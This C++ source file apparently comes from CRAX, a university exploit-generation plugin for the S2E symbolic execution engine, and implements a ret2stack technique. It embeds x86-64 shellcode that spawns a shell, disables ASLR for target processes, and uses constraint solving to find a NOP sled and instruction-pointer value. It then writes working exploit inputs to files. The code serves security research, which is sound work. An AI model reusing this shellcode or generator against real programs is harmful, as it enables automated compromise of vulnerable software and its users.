// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Expr/ConstraintBuilder.h>

#include <cassert>
#include <fstream>
#include <memory>

#include "Ret2stack.h"

using namespace klee;

namespace s2e::plugins::crax {

// http://shell-storm.org/shellcode/files/shellcode-806.php
// TODO: Allow users to specify custom shellcode via config.
std::string
Ret2stack::s_shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
                         "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

Ret2stack::Ret2stack() : Technique() {
    // Generate exploit scripts that start the target process with ASLR disabled.
    g_crax->getExploit().getProcess().setAslrEnabled(false);
}


std::vector<RopPayload> Ret2stack::getRopPayloadList() const {
    S2EExecutionState *state = g_crax->getCurrentState();

    std::map<uint64_t, uint64_t> symbolicMemoryMap = mem().getSymbolicMemory();

    for (auto it = symbolicMemoryMap.rbegin(); it != symbolicMemoryMap.rend(); it++) {
        const auto &region = *it;
        generateExploit(*state, /*base=*/region.first, /*size=*/region.second);
    }

    return {};
}

void Ret2stack::generateExploit(S2EExecutionState &state,
                                uint64_t symBlockBase,
                                uint64_t symBlockSize) const {
    if (symBlockSize < s_shellcode.size()) {
        return;
    }

    log<INFO>()
        << "Analyzing symbolic block @" << hexval(symBlockBase)
        << ", size = " << hexval(symBlockSize) << '\n';

    ConstraintBuilder exploitConstraints;
    bool isTrue = false;

    uint64_t shellcodeAddr = symBlockBase + symBlockSize - s_shellcode.size();

    while (shellcodeAddr >= symBlockBase) {
        // Use binary search to find the longest NOP sled.
        uint64_t l = symBlockBase;
        uint64_t r = symBlockBase + symBlockSize - 1;

        while (!isOverlapped(l, r)) {
            uint64_t m = l + (r - l) / 2;

            exploitConstraints.clear();
            exploitConstraints.And(injectShellcodeAt(shellcodeAddr));
            exploitConstraints.And(injectNopSledBetween(m, shellcodeAddr - 1));
            exploitConstraints.And(setRipBetween(m, shellcodeAddr));

            state.solver()->mayBeTrue(
                    Query(state.constraints(), exploitConstraints.build()), isTrue);

            if (isTrue) {
                r = m;
            } else {
                l = m;
            }
        }

        if (isTrue) {
            std::unique_ptr<S2EExecutionState> clonedState(
                    static_cast<S2EExecutionState *>(state.clone()));

            clonedState->concolics = Assignment::create(state.concolics);
            isTrue = clonedState->addConstraint(exploitConstraints.build(), true);
            assert(isTrue);

            std::vector<uint8_t> bytes
                = RopPayloadBuilder::getOneConcreteInput(*clonedState);

            if (bytes.size()) {
                std::string filename = format("exploit-%llx.bin", symBlockBase);
                std::ofstream ofs(filename, std::ios::binary);
                ofs.write(reinterpret_cast<const char *>(bytes.data()), bytes.size());
                log<WARN>() << "Generated exploit: " << filename << '\n';
                return;
            }
        }

        shellcodeAddr--;
    }

    log<WARN>() << "Could not generate any exploit for: " << hexval(symBlockBase) << '\n';
}


ref<Expr> Ret2stack::injectShellcodeAt(uint64_t addr) const {
    ConstraintBuilder cb;

    for (size_t i = 0; i < s_shellcode.size(); i++) {
        ref<Expr> target = mem().readSymbolic(addr + i, Expr::Int8);
        ref<Expr> value = ConstantExpr::create((uint8_t) s_shellcode[i], Expr::Int8);
        cb.And(EqExpr::create(target, value));
    }

    return cb.build();
}

ref<Expr> Ret2stack::injectNopSledBetween(uint64_t lowerbound,
                                          uint64_t upperbound) const {
    ConstraintBuilder cb;

    for (size_t i = lowerbound; i <= upperbound; i++) {
        ref<Expr> target = mem().readSymbolic(i, Expr::Int8);
        ref<Expr> value = ConstantExpr::create((uint8_t) 0x90, Expr::Int8);
        cb.And(EqExpr::create(target, value));
    }

    return cb.build();
}

ref<Expr> Ret2stack::setRipBetween(uint64_t lowerbound,
                                   uint64_t upperbound) const {
    constexpr uint64_t ripBits = 48;

    ref<Expr> rip = reg().readSymbolic(Register::X64::RIP, ripBits);
    ref<Expr> ripLowerbound = ConstantExpr::create(lowerbound, ripBits);
    ref<Expr> ripUpperbound = ConstantExpr::create(upperbound, ripBits);

    return AndExpr::create(UgeExpr::create(rip, ripLowerbound),
                           UleExpr::create(rip, ripUpperbound));
}

}  // namespace s2e::plugins::crax
